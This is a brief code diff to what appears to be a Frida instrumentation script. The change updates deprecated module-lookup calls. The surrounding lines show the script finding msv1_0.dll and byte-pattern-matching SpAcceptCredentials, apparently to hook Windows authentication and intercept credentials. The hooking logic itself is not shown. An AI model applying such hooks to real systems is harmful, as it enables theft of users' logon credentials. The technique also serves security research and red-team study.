@@ -11,7 +11,7 @@
 
 // Native function pointers
 //-----------------------
-var pConvertSidToStringSidA = Module.findExportByName('Advapi32.dll', 'ConvertSidToStringSidA');
+var pConvertSidToStringSidA = Process.getModuleByName('Advapi32.dll').findExportByName('ConvertSidToStringSidA');
 
 // API prototype
 //-----------------------
@@ -116,7 +116,7 @@ function StringSidFromSid(pUserSid) {
 //----------------------------------------------
 
 // Module base -> msv1_0
-var msv10Base = Module.findBaseAddress("msv1_0.dll");
+var msv10Base = (Process.findModuleByName("msv1_0.dll") || { base: null }).base;
 
 // Byte pattern -> msv1_0!SpAcceptCredentials+0x0
 var seqSpAcceptCredentials = "48 89 5c 24 08 48 89 6c 24 10" +
